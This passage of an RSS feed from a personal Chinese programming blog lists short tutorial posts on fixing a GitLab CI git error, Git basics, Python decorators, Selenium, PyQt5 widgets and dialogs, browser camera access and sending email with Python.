      <guid>https://ac-lm.github.io/posts/bug/bug10gitlab-ci-%E6%97%A0%E6%B3%95%E5%88%9D%E5%A7%8B%E5%8C%96-git-%E7%89%88%E6%9C%AC%E5%BA%93/</guid>
      <description>BUG描述 gitlab CI 报错
fatal: git fetch-pack: expected shallow list fatal: The remote end hung up unexpectedly Resolution 这是由于 git 版本过老不支持新的 API，需要升级 git
#安装源 yum install http://opensource.wandisco.com/centos/7/git/x86_64/wandisco-git-release-7-2.noarch.rpm #安装git yum install git #更新git yum update git  参考原文：fatal: git fetch-pack: expected shallow list @0neBean 
 </description>
    </item>
    
    <item>
      <title>Git(1)——Git 版本管理工具</title>
      <link>https://ac-lm.github.io/posts/git/git1git-%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</link>
      <pubDate>Tue, 05 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/git/git1git-%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</guid>
      <description>1.Git 搭载 搭载 Git 环境，下载安装 Git，Git官网下载 
在 github 或者 gitlab 上存在账户
注意：git 无法追踪一个空文件夹，当用户需要追踪一个空文件夹的时候，可以将一个称为 .gitkeep 的文件放在文件夹里
2.配置用户名与邮箱 git config --global user.name &amp;#34;???&amp;#34; git config --global user.email &amp;#34;????&amp;#34; # --global 去除则针对单个项目 3.克隆仓库 git clone ssh://url cd somethingtest touch README.md git add -A git commit -m &amp;#34;new&amp;#34; git push -u origin master 4.上传文件创建仓库 cd existing_folder git init git remote add origin ssh://url git add -A //. git commit -m &amp;#34;Initial commit&amp;#34; git push -u origin master 5.</description>
    </item>
    
    <item>
      <title>Python(15)——装饰器</title>
      <link>https://ac-lm.github.io/posts/python/python15%E8%A3%85%E9%A5%B0%E5%99%A8/</link>
      <pubDate>Tue, 05 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python15%E8%A3%85%E9%A5%B0%E5%99%A8/</guid>
      <description>1.什么是装饰器 装饰器本质上是一个 Python 函数，它可以让其他函数在不需要做任何代码变动的前提下增加额外功能，装饰器的返回值也是一个函数对象。它经常用于有切面需求的场景，比如：插入日志、性能测试、事务处理、缓存、权限校验等场景。装饰器是解决这类问题的绝佳设计，有了装饰器，我们就可以抽离出大量与函数功能本身无关的雷同代码并继续重用。概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。
2.举例说明 def foo(): print(&amp;#39;I am foo&amp;#39;) 现在有一个新的需求，希望可以记录下函数的执行日志，于是在代码中添加日志代码：
def foo(): print(&amp;#39;I am foo&amp;#39;) logging.info(&amp;#39;foo is running&amp;#39;) bar()、bar2()也有类似的需求，怎么做？再写一个logging在bar函数里？这样就造成大量雷同的代码，为了减少重复写代码，我们可以这样做，重新定义一个函数：专门处理日志 ，日志处理完之后再执行真正的业务代码
def use_logging(func): logging.warn(&amp;#34;%sis running&amp;#34; % func.__name__) func() def bar(): print(&amp;#39;I am bar&amp;#39;) use_logging(bar) 逻辑上不难理解， 但是这样的话，我们每次都要将一个函数作为参数传递给use_logging函数。而且这种方式已经破坏了原有的代码逻辑结构，之前执行业务逻辑时，执行运行bar()，但是现在不得不改成use_logging(bar)。那么有没有更好的方式的呢？当然有，答案就是装饰器。
def use_logging(func): def wrapper(*args, **kwargs): logging.warn(&amp;#34;%sis running&amp;#34; % func.__name__) return func(*args, **kwargs) return wrapper def bar(): print(&amp;#39;i am bar&amp;#39;) bar = use_logging(bar) bar() 函数use_logging就是装饰器，它把执行真正业务方法的func包裹在函数里面，看起来像bar被use_logging装饰了。在这个例子中，函数进入和退出时 ，被称为一个横切面(Aspect)，这种编程方式被称为面向切面的编程(Aspect-Oriented Programming)。
@符号是装饰器的语法糖，在定义函数的时候使用，避免再一次赋值操作
def use_logging(func): def wrapper(*args, **kwargs): logging.warn(&amp;#34;%sis running&amp;#34; % func.</description>
    </item>
    
    <item>
      <title>Python(14)——获取当前页面URL</title>
      <link>https://ac-lm.github.io/posts/python/python14%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2-url/</link>
      <pubDate>Mon, 04 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python14%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2-url/</guid>
      <description>1.直接获取 driver=webdriver.Chrome() driver.get(&amp;#39;http:/www.baidu.com&amp;#39;) print(driver.current_url) driver.quit() 2.问题 当浏览器新开页面后 current_url() 获取的还是原页面URL，这是因为浏览器还没有定位到新开的页面
3.解决 添加定位页面代码之后再使用current_url获取地址
driver=webdriver.Chrome() driver.get(&amp;#39;http:/www.baidu.com&amp;#39;) # 跳转到新页面 driver.find_element_by_link_text(&amp;#39;新闻&amp;#39;).click() #切换当前页面标签 driver.switch_to.window(driver.window_handles[1]) print(driver.current_url) driver.quit() </description>
    </item>
    
    <item>
      <title>PyQt5(14)——程序的启动</title>
      <link>https://ac-lm.github.io/posts/pyqt5/pyqt514%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%90%AF%E5%8A%A8/</link>
      <pubDate>Sat, 26 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pyqt5/pyqt514%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%90%AF%E5%8A%A8/</guid>
      <description>1.启动的代码 apps = QApplication(sys.argv) myWin = MyWindow() # 创建Qt类 myWin.show() # 展示 sys.exit(apps.exec_()) 2.QApplication(sys.argv) 运行程序时候获取命令行参数，使Qt的各种类能获取到程序返回的参数
3.sys.exit(apps.exec_()) 使得指程序一直循环运行直到主窗口被关闭终止进程（如果没有这句话，程序运行时会一闪而过），作用是给予系统一个结束程序的状态判断</description>
    </item>
    
    <item>
      <title>PyQt5(13)——非模式显示 show 与模式 exec_</title>
      <link>https://ac-lm.github.io/posts/pyqt5/pyqt513%E9%9D%9E%E6%A8%A1%E5%BC%8F%E6%98%BE%E7%A4%BA-show-%E4%B8%8E%E6%A8%A1%E5%BC%8F-exec_/</link>
      <pubDate>Fri, 25 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pyqt5/pyqt513%E9%9D%9E%E6%A8%A1%E5%BC%8F%E6%98%BE%E7%A4%BA-show-%E4%B8%8E%E6%A8%A1%E5%BC%8F-exec_/</guid>
      <description>1.非模式显示 show() 对话框弹出后，控制权即刻返回给调用函数，在显示期间，用户可以切换同程序下的其它窗口，程序照常运行。
2.模式显示 exec_() 对话框弹出后，锁住程序直到用户关闭该对话框为止，函数返回一个 DialogCode 结果。在显示期间，用户不可以切换同程序下的其它窗口。
3.模式与非模式  模式对话框，就是在弹出窗口的时候，整个程序就被锁定了，处于等待状态，直到对话框被关闭。这时往往是需要对话框的返回值进行下面的操作。如：确认窗口（选择“是”或“否”）。 非模式对话框，在调用弹出窗口之后，调用即刻返回，继续下面的操作。这里只是一个调用指令的发出，不等待也不做任何处理。如：查找框。  两者的返回值不同。exec() 有返回值，show() 没有返回值。其次这两个方法的作用也不同。调用 show() 的作用仅仅是将 widget 及其上的内容都显示出来，控制权即刻返回给调用函数。而调用 exec() 后，调用线程将会被阻塞，锁住程序直到用户关闭该对话框，期间用户不可以切换同程序下的其它窗口直到 Dialog 关闭。</description>
    </item>
    
    <item>
      <title>PyQt5(12)——QMessageBox 消息对话框类</title>
      <link>https://ac-lm.github.io/posts/pyqt5/pyqt512qmessagebox-%E6%B6%88%E6%81%AF%E5%AF%B9%E8%AF%9D%E6%A1%86%E7%B1%BB/</link>
      <pubDate>Thu, 24 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pyqt5/pyqt512qmessagebox-%E6%B6%88%E6%81%AF%E5%AF%B9%E8%AF%9D%E6%A1%86%E7%B1%BB/</guid>
      <description>1.QMessageBox information(QWdiget parent,title,text,buttons,defaultButton) #| 弹出消息对话框  question（QWidget parent,title,text,buttons,defaultButton） #| 弹出问答对话框 warning（QWidget parent,title,text,buttons,defaultButton） #| 弹出警告对话框  critical（QWidget parent,title,text,buttons,defaultButton） #| 弹出严重错误对话框  about（QWidget parent,title,text） #| 弹出关于对话框  # 参数------------------------------------------------------------------------------ parent：指定的父窗口控件 title：对话框标题 text：对话框文本 buttons：标准按钮，默认为ok按钮，可以有多个，用 | 进行分隔 defaultButton：关闭对话框默认返回的按钮 # 方法------------------------------------------------------------------------------ setTitle() # 设置标题 setText() # 设置正文消息 setIcon() # 设置弹出对话框的图片  2.QMessageBox的标准按钮类型 QMessage.Ok #| 同意操作 | QMessage.Cancel #| 取消操作 | QMessage.Yes #| 同意操作 | QMessage.No #| 取消操作 | QMessage.Abort #| 终止操作 | QMessage.Retry #| 重试操作 | QMessage.</description>
    </item>
    
    <item>
      <title>PyQt5(11)——QTextEdit 文本元件</title>
      <link>https://ac-lm.github.io/posts/pyqt5/pyqt511qtextedit-%E6%96%87%E6%9C%AC%E5%85%83%E4%BB%B6/</link>
      <pubDate>Wed, 23 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pyqt5/pyqt511qtextedit-%E6%96%87%E6%9C%AC%E5%85%83%E4%BB%B6/</guid>
      <description>1.占位文本的使用 setPlaceholderText() #| 设置占位文本 placeholderText() #| 获取占位文本 2. 设置文本格式 setPlainText(str) #| 设置普通文本 insertPlainText(str) #| 插入普通文本 toPlainText() #| -&amp;gt; str 返回普通文本 setHtml(str) #| 设置Html文本 insertHtml(str) #| 插入Html文本 toHtml() #| -&amp;gt; str 返回Html 文本 setText(str) #| 设置文本（自动识别） append(str) #| 追加文本 clear() #| 清空文本 3.设置字体和大小 setFontPointSize(float) # 设置字体大小 setFontFamily(str) # 设置字体 </description>
    </item>
    
    <item>
      <title>Web开发(5)——实现摄像头开启</title>
      <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%915%E5%AE%9E%E7%8E%B0%E6%91%84%E5%83%8F%E5%A4%B4%E5%BC%80%E5%90%AF/</link>
      <pubDate>Wed, 23 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%915%E5%AE%9E%E7%8E%B0%E6%91%84%E5%83%8F%E5%A4%B4%E5%BC%80%E5%90%AF/</guid>
      <description>1.HTML实现 &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;!-- 样式部分可以忽略 --&amp;gt; &amp;lt;style&amp;gt; * { padding: 0; margin: 0; } div { width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; } .btn { width: 100px; height: 50px; border-radius: 10px; background: #ff9900; line-height: 50px; text-align: center; color: #fff; box-shadow: 0 0 10px #999; } video, canvas { width: 300px; height: 300px; border: 5px solid #000; border-radius: 10px; margin-left: 5px; } &amp;lt;/style&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;div&amp;gt; &amp;lt;div id=&amp;#34;play&amp;#34; class=&amp;#34;btn&amp;#34;&amp;gt;开启摄像&amp;lt;/div&amp;gt; &amp;lt;div id=&amp;#34;take&amp;#34; class=&amp;#34;btn&amp;#34;&amp;gt;拍照&amp;lt;/div&amp;gt; &amp;lt;video id=&amp;#34;video&amp;#34;&amp;gt;&amp;lt;/video&amp;gt; &amp;lt;!</description>
    </item>
    
    <item>
      <title>随记(20)——目录的简单表示</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B020%E7%9B%AE%E5%BD%95%E7%9A%84%E7%AE%80%E5%8D%95%E8%A1%A8%E7%A4%BA/</link>
      <pubDate>Wed, 23 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B020%E7%9B%AE%E5%BD%95%E7%9A%84%E7%AE%80%E5%8D%95%E8%A1%A8%E7%A4%BA/</guid>
      <description> 用户所在的工作目录，当前目录，使用一个点 . 表示，即 ./ 当前目录的上一级目录，父目录，使用两个点 .. 来表示，即 ../ 使用 \ 来表示根目录 如果一个目录或文件名以一个点 . 开始，表示这个目录或文件是一个隐藏目录或文件(如：.bashrc)  </description>
    </item>
    
    <item>
      <title>PyQt5(10)——QLineEdit 文本元件</title>
      <link>https://ac-lm.github.io/posts/pyqt5/pyqt510qlineedit-%E6%96%87%E6%9C%AC%E5%85%83%E4%BB%B6/</link>
      <pubDate>Tue, 22 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pyqt5/pyqt510qlineedit-%E6%96%87%E6%9C%AC%E5%85%83%E4%BB%B6/</guid>
      <description>1.常用方法 setText(str) # 设置普通文本 Text() # -&amp;gt; str返回普通文本 2.使用掩码限制格式 ipLineEdit.setInputMask(&amp;#39;000.000.000.000;_&amp;#39;) macLineEdit.setInputMask(&amp;#39;HH:HH:HH:HH:HH:HH;_&amp;#39;) dateLineEdit.setInputMask(&amp;#39;0000-00-00&amp;#39;) licenseLineEdit.setInputMask(&amp;#39;&amp;gt;AAAAA-AAAAA-AAAAA-AAAAA-AAAAA;#&amp;#39;) #---掩码类型------------------------------------------------------------ A ASCII字母字符是必须输入的(A-Z、a-z) a ASCII字母字符是允许输入的,但不是必需的(A-Z、a-z) N ASCII字母字符是必须输入的(A-Z、a-z、0-9) n ASII字母字符是允许输入的,但不是必需的(A-Z、a-z、0-9) X 任何字符都是必须输入的 x 任何字符都是允许输入的,但不是必需的 9 ASCII数字字符是必须输入的(0-9) 0 ASCII数字字符是允许输入的,但不是必需的(0-9) D ASCII数字字符是必须输入的(1-9) d ASCII数字字符是允许输入的,但不是必需的(1-9) # ASCI数字字符或加减符号是允许输入的,但不是必需的 H 十六进制格式字符是必须输入的(A-F、a-f、0-9) h 十六进制格式字符是允许输入的,但不是必需的(A-F、a-f、0-9) B 二进制格式字符是必须输入的(0,1) b 二进制格式字符是允许输入的,但不是必需的(0,1) &amp;gt; 所有的字母字符都大写 &amp;lt; 所有的字母字符都小写 ! 关闭大小写转换 \ 使用&amp;#34;\&amp;#34;转义上面列出的字符 #--------------------------------------------------------------------- </description>
    </item>
    
    <item>
      <title>PyQt5(9)——QInputDialog 输入对话框类</title>
      <link>https://ac-lm.github.io/posts/pyqt5/pyqt59qinputdialog-%E8%BE%93%E5%85%A5%E5%AF%B9%E8%AF%9D%E6%A1%86%E7%B1%BB/</link>
      <pubDate>Mon, 21 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pyqt5/pyqt59qinputdialog-%E8%BE%93%E5%85%A5%E5%AF%B9%E8%AF%9D%E6%A1%86%E7%B1%BB/</guid>
      <description>1.简介 QInputDialog 继承自 QDialog 提供了一种简单的对话框来获得用户的单个输入信息
class QInputDialog(QDialog) | QInputDialog(QWidget parent=None, Qt.WindowFlags flags=0) 常用以下方法获取对话框的信息
 字符串型 QInputDialog.getText Int类型数据 QInputDialog.getInt double类型数据 QInputDialog.getDouble 下拉列表框的条目 QInputDialog.getItem  2.QInputDialog.getText QString getText( QWidget * parent, #标准输入对话框的父窗口 const QString &amp;amp; title, #输入对话框的标题名 const QString &amp;amp; label,#标准输入对话框的标签提示 const QString &amp;amp; text = QString(), #标准字符串输入对话框弹出时QLineEdit控件中默认出现的文字 bool * ok = 0, #用于指示标准输入对话框的哪个按钮被触发，若ok为true，则表示用户单击了OK（确定）按钮，若ok为false，则表示用户单击了Cancel（取消）按钮 Qt::WindowFlags flags = 0, #知名标准输入对话框的窗体标识 Qt::InputMethodHints inputMethodHints = Qt::ImhNone ); [static] 3.QInputDialog.getItem QString getItem( QWidget * parent, #标准输入对话框的父窗口 const QString &amp;amp; title, #标准输入对话框的标题名 const QString &amp;amp; label, #标准输入对话框的标签提示 const QStringList &amp;amp; list, #指定标准输入对话框中QComboBox控件显示的可选条目，为一个QStringList对象 int current = 0, #指定标准输入对话框中QComboBox控件显示的可选条目，为一个QStringList对象 bool editable = true, #指定QComboBox控件中显示的文字是否可编辑； bool * ok = 0, #用于指定标准输入对话框的哪个那妞被触发，若ok为false，则表示用户单击了Cancel（取消）按钮； Qt::WindowFlags f = 0 ) ; [static] #用于指定标准输入对话框的哪个那妞被触发，若ok为false，则表示用户单击了Cancel（取消）按钮； 4.</description>
    </item>
    
    <item>
      <title>PyQt5(8)——QFileDialog 文件类</title>
      <link>https://ac-lm.github.io/posts/pyqt5/pyqt58qfiledialog-%E6%96%87%E4%BB%B6%E7%B1%BB/</link>
      <pubDate>Sun, 20 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pyqt5/pyqt58qfiledialog-%E6%96%87%E4%BB%B6%E7%B1%BB/</guid>
      <description>1.调用文件对话框获取文件信息 # 主要接口 QFileDialog.getExistingDirectory() # 返回选中的文件夹路径 QFileDialog.getOpenFileName() # 返回选中的文件路径 QFileDialog.getOpenFileNames() # 返回选中的多个文件路径 QFileDialog.getSaveFileName() # 存储文件 2.返回选中的文件夹路径 QFileDialog.getExistingDirectory(None, &amp;#34;请选择文件夹路径&amp;#34;, &amp;#34;D:\\Qt_ui&amp;#34;) QFileDialog.getExistingDirectory(self, &amp;#34;请选择文件夹路径&amp;#34;, &amp;#34;D:\\Qt_ui&amp;#34;) #--------------------------------------------------- 第一个参数，有self的话用self，没有的话用None。 第二个参数，设置窗口名。 第三个参数，设置默认打开路径。 3.获取单个文件的路径 QFileDialog.getOpenFileName(myWin, directory=&amp;#39;.&amp;#39;, filter=&amp;#39;Excel files(*.xlsx ; *.xls)&amp;#39;) #------------------------------------------------------------------- 第一个参数：parent 用于指定父组件。PS:很多Qt组件的构造函数都会有这么一个parent参数，并提供一个默认值0 第二个参数：caption 是对话框的标题 第三个参数：dir 是对话框显示时默认打开的目录。&amp;#34;.&amp;#34; 代表程序运行目录，&amp;#34;/&amp;#34; 代表当前盘符的根目录 第四个参数：filter 是对话框的后缀名过滤器。如果显示该目录下的全部文件可以 *.* ，需要什么类型文件修改后面的 * ，即正则 第六个参数：options，是对话框的一些参数设定，比如只显示文件夹等等 4.获取多文件路径实例 QFileDialog.getOpenFileNames(None, &amp;#34;请选择要添加的文件&amp;#34;, path, &amp;#34;Text Files (*.xls;*.xlsx);;All Files (*)&amp;#34;) #----------------------------------------------------------- 第四个参数，列出可以进行筛选的参数，第一个是默认的，多个用双分号分开。 </description>
    </item>
    
    <item>
      <title>PyQt5(7)——QDialog 消息提示类</title>
      <link>https://ac-lm.github.io/posts/pyqt5/pyqt57qdialog-%E6%B6%88%E6%81%AF%E6%8F%90%E7%A4%BA%E7%B1%BB/</link>
      <pubDate>Sat, 19 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pyqt5/pyqt57qdialog-%E6%B6%88%E6%81%AF%E6%8F%90%E7%A4%BA%E7%B1%BB/</guid>
      <description>1.QDialog的子类 QMessageBox，QFileDialog，QColorDialog，QFontDialog，QInputDialog等
2.QDialog类中的常用方法 setWindowTitle() # 设置对话框标题 setWindowModality() # 设置窗口模态 #-值----------------------------------------------- Qt.NonModal：非模态，可以和程序的其他窗口进行交互 Qt.WindowModal:窗口模态，程序在未处理玩当前对话框时，将阻止和对话框的父窗口进行交互 Qt.ApplicationModal：应用程序模态，阻止和任何其他窗口进行交互 </description>
    </item>
    
    <item>
      <title>PyQt5(6)——信号和槽</title>
      <link>https://ac-lm.github.io/posts/pyqt5/pyqt56%E4%BF%A1%E5%8F%B7%E5%92%8C%E6%A7%BD/</link>
      <pubDate>Fri, 18 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pyqt5/pyqt56%E4%BF%A1%E5%8F%B7%E5%92%8C%E6%A7%BD/</guid>
      <description>1.概述 信号和槽机制是 QT 的核心机制，其是一种高级接口，应用于对象之间的通信，它是 QT 的核心特性，也是 QT 区别于其它工具包的重要地方。信号和槽是 QT 自行定义的一种通信机制，它独立于标准的 C/C++ 语言，因此要正确的处理信号和槽，必须借助一个称为moc(Meta Object Compiler)的 QT 工具，该工具是一个 C++ 预处理程序，它为高层次的事件处理自动生成所需要的附加代码。
在其它的 GUI 工具包中，窗口部件 (widget) 都有一个回调函数用于响应它们能触发的每个动作，这个回调函数通常是一个指向某个函数的指针。在 QT 中信号和槽取代了这些凌乱的函数指针，使得我们编写这些通信程序更为简洁明了。信号和槽能携带任意数量和任意类型的参数，且其的类型是完全安全的，不会像回调函数那样产生 core dumps。
所有从 QObject 或其子类 ( 例如 Qwidget ）派生的类都能够包含信号和槽。当对象改变其状态时，信号就由该对象发射 (emit) 出去，这就是对象所要做的全部事情，它不需要知道另一端是谁在接收这个信号。这也就是真正的信息封装，它确保对象被当作一个真正的软件组件来使用。槽用于接收信号，主要是普通的对象成员函数，同样的一个槽并不知道是否有任何信号与自己相连接。
2.信号与槽的关联 通过调用 QObject 对象的 connect 函数来将某个对象的信号与另外一个对象的槽函数相关联，这样当发射者发射信号时，接收者的槽函数将被调用。该函数的定义如下：
bool QObject::connect( const QObject * sender, const char * signal, const QObject * receiver, const char * member ) [static] connect 函数将信号发送者 sender 对象中的信号 signal 与接受者 receiver 中的 member 槽函数联系起来。注意的是，当指定信号 signal时必须使用宏SIGNAL，当指定槽函数时必须使用宏SLOT。</description>
    </item>
    
    <item>
      <title>PyQt5(5)——最大最小关闭按钮的隐藏</title>
      <link>https://ac-lm.github.io/posts/pyqt5/pyqt55%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%85%B3%E9%97%AD%E6%8C%89%E9%92%AE%E7%9A%84%E9%9A%90%E8%97%8F/</link>
      <pubDate>Thu, 17 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pyqt5/pyqt55%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%85%B3%E9%97%AD%E6%8C%89%E9%92%AE%E7%9A%84%E9%9A%90%E8%97%8F/</guid>
      <description>1.示例代码 # 1、直接隐藏界面整个头部内容 setWindowFlags(Qt.FramelessWindowHint) # 2、显示最小化按钮 setWindowFlags(Qt.WindowMinimizeButtonHint) # 3、显示最大化按钮 setWindowFlags(Qt.WindowMaximizeButtonHint) # 4、显示最小化和最大化按钮 setWindowFlags(Qt.WindowMinMaxButtonsHint) # 5、显示关闭按钮 setWindowFlags(Qt.WindowCloseButtonHint) # 6、固定界面大小尺寸，不能进行缩放（三种方法都可以） setWindowFlags(Qt.MSWindowsFixedSizeDialogHint) setFixedSize(width, height) setMinimumSize(800, 700) setMaximumSize(800, 700) # 7、取消最小化和最大化，及关闭按钮（利用固定大小方法） setWindowFlags(Qt.WindowMaximizeButtonHint | Qt.MSWindowsFixedSizeDialogHint) </description>
    </item>
    
    <item>
      <title>PyQt5(4)——退出事件的重写</title>
      <link>https://ac-lm.github.io/posts/pyqt5/pyqt54%E9%80%80%E5%87%BA%E4%BA%8B%E4%BB%B6%E7%9A%84%E9%87%8D%E5%86%99/</link>
      <pubDate>Wed, 16 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pyqt5/pyqt54%E9%80%80%E5%87%BA%E4%BA%8B%E4%BB%B6%E7%9A%84%E9%87%8D%E5%86%99/</guid>
      <description>1.示例 import sys from PyQt5 import QtWidgets from PyQt5.QtGui import QFont # QtWidgets 不包含 QFont 必须调用 QtGui class MessageBox(QtWidgets.QWidget): def __init__(self,parent = None): # parent = None 代表此 QWidget 属于最上层的窗口,也就是 MainWindows. QtWidgets.QWidget.__init__(self) # 因为继承关系，要对父类初始化 # 通过 super 初始化父类，__init__() 函数无 self，若直接 QtWidgets.QWidget.__init__(self)，括号里是有self的 self.setGeometry(300, 300, 1000,1000) # setGeometry() 设置窗口在屏幕上的位置和设置窗口本身的大小。它的前两个参数是窗口在屏幕上的 x 和 y 坐标。后两个参数是窗口本身的宽和高 self.setToolTip(u&amp;#39;&amp;lt;b&amp;gt;程序&amp;lt;/b&amp;gt;提示&amp;#39;) # 调用 setToolTip() 方法,该方法接受富文本格式的参数,css 之类。 QtWidgets.QToolTip.setFont(QFont(&amp;#39;华文楷体&amp;#39;, 10)) # 设置字体以及字体大小 #------------------------------------------------------------------------------ # 当我们关闭一个窗口时，在 PyQt 中就会触发一个 QCloseEvent 的事件，正常情况下会直接关闭这个窗口， # 但是我们不希望这样的事情发生，所以我们需要重新定义 QCloseEvent，函数名称为 closeEvent 不可变 #-------------------------------------------------------------------------------- def closeEvent(self,event): # 函数名固定不可变 reply=QtWidgets.</description>
    </item>
    
    <item>
      <title>PyQt5(3)——QProgressDialog 进度条</title>
      <link>https://ac-lm.github.io/posts/pyqt5/pyqt53qprogressdialog-%E8%BF%9B%E5%BA%A6%E6%9D%A1/</link>
      <pubDate>Tue, 15 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pyqt5/pyqt53qprogressdialog-%E8%BF%9B%E5%BA%A6%E6%9D%A1/</guid>
      <description>1.QProgressDialog 进度条使用 steps 的概念。在指定最小和最大可能的 step 值后，它将显示已经完成的 step 的百分比。百分比是通过将进度(value() - minimum()) / (maximum() - minimum())来计算的。
可以使用 setMinimum() 和 setMaximum() 指定最小和最大 steps。默认值是0和99。当前的 step 由 setValue() 设置。进度条可以通过 reset() 重新开始。
如果最小值和最大值都设置为 0，那么栏会显示一个繁忙的指示符，而不是步骤的百分比
2.常用方法 setMinimum() # 设置操作中的“steps”数量 setMaximum() # 设置操作中的“steps”数量 setValue() # 任意选择步数 setAutoReset() # 自动重置 setAutoClose() # 自动关闭 setRange(0,num) # 设置最小和最大值 wasCanceled() # 是否按下取消按钮 3.实例 def showDialog(self): num = int(self.edit.text()) progress = QProgressDialog(self) progress.setWindowTitle(&amp;#34;请稍等&amp;#34;) progress.setLabelText(&amp;#34;正在操作...&amp;#34;) progress.setCancelButtonText(&amp;#34;取消&amp;#34;) progress.setMinimumDuration(5) progress.setWindowModality(Qt.WindowModal) progress.setRange(0,num) for i in range(num): progress.setValue(i) if progress.</description>
    </item>
    
    <item>
      <title>Python(13)——邮件发送</title>
      <link>https://ac-lm.github.io/posts/python/python13%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81/</link>
      <pubDate>Tue, 15 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python13%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81/</guid>
      <description>1.发送简单邮件 import smtplib #发送字符串的邮件 from email.mime.text import MIMEText #处理多种形态的邮件主体我们需要 MIMEMultipart 类 from email.mime.multipart import MIMEMultipart #处理图片需要 MIMEImage 类 from email.mime.image import MIMEImage # qq邮箱smtp服务器 host_server = &amp;#39;smtp.qq.com&amp;#39; # sender_qq为发件人的qq号码 sender_qq = &amp;#39;13VVVVVVVV@qq.com&amp;#39; # pwd为qq邮箱的授权码 pwd = &amp;#39;nzrVVVVVVVV&amp;#39; # 发件人的邮箱 sender_qq_mail = &amp;#39;13VVVVVVV@qq.com&amp;#39; # 收件人邮箱 receiver = &amp;#39;13VVVVVVVVV@qq.com&amp;#39; # 邮件的正文内容 mail_content = &amp;#39;你好，这是使用python登录qq邮箱发邮件的测试&amp;#39; # 邮件标题 mail_title = &amp;#39;Max\&amp;#39;s的邮件&amp;#39; # ssl登录 smtp = SMTP_SSL(host_server) # set_debuglevel()是用来调试的。参数值为1表示开启调试模式，参数值为0关闭调试模式 smtp.set_debuglevel(0) smtp.ehlo(host_server) smtp.login(sender_qq, pwd) msg = MIMEText(mail_content, &amp;#34;plain&amp;#34;, &amp;#39;utf-8&amp;#39;) msg[&amp;#34;Subject&amp;#34;] = Header(mail_title, &amp;#39;utf-8&amp;#39;) msg[&amp;#34;From&amp;#34;] = sender_qq_mail msg[&amp;#34;To&amp;#34;] = receiver smtp.</description>
    </item>
    
    <item>
      <title>PyQt5(2)——焦点控制</title>
      <link>https://ac-lm.github.io/posts/pyqt5/pyqt52%E7%84%A6%E7%82%B9%E6%8E%A7%E5%88%B6/</link>
      <pubDate>Mon, 14 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pyqt5/pyqt52%E7%84%A6%E7%82%B9%E6%8E%A7%E5%88%B6/</guid>
      <description>1.焦点控制 setFocus() # 设置指定控件获取焦点 setFocusPolicy(Policy) # 设置焦点获取策略 clearFocus() # 取消焦点 FocusWidget() # 获取子控件当前聚焦的控件 FocusNextChild() # 聚焦下一个子控件 FocusPrevious() # 聚焦上一个子控件 FocusNextPreviousChild(bool) # True:下一个 False:上一个 setTabOrder(pro_widget,next_widget) # 静态方法 设置子控件获取焦点的先后顺序 2.Policy Qt.TabFocus() # 通过Tab键获取焦点 Qt.ClickFocus() # 通过被单击获取焦点 Qt.StrongFocus() # 可以通过上面两种方式获取焦点 Qt.NoFocus() # 不能通过上面两种方式获取焦点 </description>
    </item>
    
    <item>
      <title>Python(12)——多线程的返回值</title>
      <link>https://ac-lm.github.io/posts/python/python12%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC/</link>
      <pubDate>Mon, 14 Dec 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python12%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC/</guid>
